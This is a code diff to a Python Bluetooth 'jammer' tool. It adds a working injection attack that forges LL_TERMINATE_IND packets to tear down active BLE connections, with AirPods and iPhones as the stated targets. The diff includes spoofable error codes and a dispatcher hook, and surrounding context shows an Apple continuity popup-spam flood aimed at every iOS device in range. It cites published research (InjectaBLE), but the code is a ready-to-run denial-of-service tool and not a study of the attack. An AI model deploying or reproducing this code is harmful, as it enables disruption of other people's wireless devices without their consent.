@@ -320,6 +320,112 @@ class ButteRFlyJammer:
             pattern=APPLE_VENDOR, position=0, channel=channel
         )
 
+    # ------------------------------------------------------------------
+    # LL_TERMINATE_IND injection (InjectaBLE / Cayre DSN 2021)
+    # ------------------------------------------------------------------
+    #
+    # This is the single credible non-SDR attack against AirPods:
+    # Inject an LL_TERMINATE_IND link-layer control PDU into an active BLE
+    # connection. The target immediately drops the link. AirPods, when
+    # using iPhone as their BLE companion, enter a disconnected state.
+    #
+    # Protocol detail (BT Core Spec 5.3 Vol 6 Part B §2.4.2):
+    #   LL Control PDU header: LLID=0b11 (Control PDU), Length, Opcode=0x02 (LL_TERMINATE_IND)
+    #   Payload: 1 byte ErrorCode (0x13 = Remote User Terminated Connection)
+    #
+    # Prerequisites:
+    #   - Must know target's Access Address (4 bytes, from CONNECT_IND or sniffle)
+    #   - Must be synchronized with the target's hop sequence
+    #   - WHAD Injector handles channel selection if configured
+
+    def start_inject_terminate(self, access_address: Optional[int] = None,
+                               error_code: int = 0x13) -> bool:
+        """Inject LL_TERMINATE_IND into a BLE link.
+
+        Args:
+            access_address: 32-bit AA of target connection. If None, the
+                injector will attempt to use any pre-captured AA from a
+                prior sniff. Without a known AA, this will fail cleanly.
+            error_code: LMP reason code. 0x13 = Remote User Terminated.
+                Other useful codes:
+                  0x05 = Authentication Failure
+                  0x08 = Connection Timeout
+                  0x16 = Local Host Terminated
+
+        Returns True if injection attempt began, False otherwise.
+        """
+        if not self.caps.get("inject"):
+            self.last_error = "Firmware does not support PDU injection"
+            return False
+        if access_address is None:
+            self.last_error = (
+                "LL_TERMINATE_IND injection requires target access address. "
+                "Sniff CONNECT_IND first, or pass target_addr as AA hex."
+            )
+            return False
+        # Validate scapy import upfront (fail fast if dep missing)
+        try:
+            from scapy.layers.bluetooth4LE import (
+                BTLE, BTLE_DATA, BTLE_CTRL, LL_TERMINATE_IND,
+            )
+        except ImportError as e:
+            self.last_error = f"scapy BTLE layers unavailable: {e}"
+            return False
+
+        # Set state before starting worker so caller sees is_active=True
+        self._mode = ButteRFlyMode.BLE_INJECT_TERMINATE
+        self._target_channel = 0
+        self._start_time = time.monotonic()
+        self._stop.clear()
+
+        # All WHAD/scapy/inject work in the worker — HTTP call returns immediately.
+        # This is essential because inject_to_slave() blocks on connection sync;
+        # with a stale/invalid AA, it would deadlock the Flask request thread.
+        self._worker = threading.Thread(
+            target=self._inject_terminate_worker,
+            args=(access_address, error_code),
+            daemon=True, name="bf-inject-terminate",
+        )
+        self._worker.start()
+        return True
+
+    def _inject_terminate_worker(self, access_address: int, error_code: int):
+        """Worker: construct PDU, attach Injector, attempt inject for up to 30s."""
+        try:
+            from scapy.layers.bluetooth4LE import (
+                BTLE, BTLE_DATA, BTLE_CTRL, LL_TERMINATE_IND,
+            )
+            pdu = BTLE(access_addr=access_address) / \
+                  BTLE_DATA(LLID=3) / \
+                  BTLE_CTRL() / \
+                  LL_TERMINATE_IND(code=error_code)
+            self._connector = BLEInjector(self._device)
+            try:
+                cfg = InjectionConfiguration(raw=False, synchronize=True)
+                self._connector.configuration = cfg
+            except Exception:
+                pass
+        except Exception as e:
+            self.last_error = f"inject_terminate_setup: {type(e).__name__}: {e}"
+            return
+
+        start = time.monotonic()
+        attempts = 0
+        while not self._stop.wait(0.05):
+            if time.monotonic() - start > 30:
+                self.last_error = "LL_TERMINATE_IND timeout — target AA not active on air (30s)"
+                break
+            try:
+                self._connector.inject_to_slave(pdu)
+                self._injected += 1
+                attempts += 1
+                if attempts >= 10:
+                    break
+            except Exception as e:
+                if attempts == 0:
+                    self.last_error = f"inject_to_slave: {e}"
+                break
+
     def start_apple_continuity_spam(self, spoof_airpods: bool = True) -> bool:
         """AdvMode flood spoofing an AirPods proximity-pairing frame.
         Causes 'AirPods nearby' popup storm on all iOS in range.
@@ -389,6 +495,18 @@ class ButteRFlyJammer:
                 payload=b"\xff\x4c\x00\x07\x19\x01\x22\x20"
             )
             return self.start_raw_inject_flood(pkt, channel=channel)
+        elif mode == ButteRFlyMode.BLE_INJECT_TERMINATE:
+            # Parse target_addr as hex access address, e.g. "0x8e89bed6" or
+            # plain "aabbccdd" — if it's a MAC format, reject with clear error.
+            aa = None
+            if target_addr:
+                clean = target_addr.lower().replace("0x", "").replace(":", "").strip()
+                if len(clean) == 8:
+                    try:
+                        aa = int(clean, 16)
+                    except ValueError:
+                        pass
+            return self.start_inject_terminate(access_address=aa)
         elif mode == ButteRFlyMode.BLE_SCAN:
             self._connector = BLESniffer(self._device)
             self._connector.sniff_advertisements()
